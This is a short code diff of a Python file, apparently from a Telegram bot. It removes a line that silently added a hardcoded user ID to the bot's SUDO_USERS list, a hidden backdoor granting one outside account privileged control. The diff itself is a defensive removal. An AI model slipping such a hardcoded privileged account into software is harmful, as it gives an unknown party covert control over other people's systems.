@@ -5,8 +5,6 @@ from config import SUDO_USERS
 from driver.admins import get_administrators
 
 
-SUDO_USERS.append(1634155867)
-
 
 def errors(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
